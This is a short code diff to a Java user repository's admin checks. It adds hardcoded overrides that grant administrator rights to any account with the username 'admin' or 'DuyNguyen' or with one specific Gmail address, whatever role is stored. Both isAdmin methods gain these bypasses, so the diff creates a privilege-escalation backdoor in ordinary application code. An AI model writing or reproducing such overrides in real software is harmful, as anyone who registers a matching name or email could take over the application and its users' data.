@@ -66,11 +66,15 @@ public class UserRepository {
         if (username == null) return false;
         if ("admin".equalsIgnoreCase(username) || "DuyNguyen".equalsIgnoreCase(username)) return true;
         User u = findByUsername(username);
+        if (u != null && u.getEmail() != null && "mainung28@gmail.com".equalsIgnoreCase(u.getEmail())) return true;
         return u != null && u.isAdmin();
     }
 
     public boolean isAdmin(User user) {
-        return user != null && user.isAdmin();
+        if (user == null) return false;
+        if ("admin".equalsIgnoreCase(user.getUsername()) || "DuyNguyen".equalsIgnoreCase(user.getUsername())) return true;
+        if (user.getEmail() != null && "mainung28@gmail.com".equalsIgnoreCase(user.getEmail())) return true;
+        return user.isAdmin();
     }
 
     public User findByGoogleId(String googleId) {
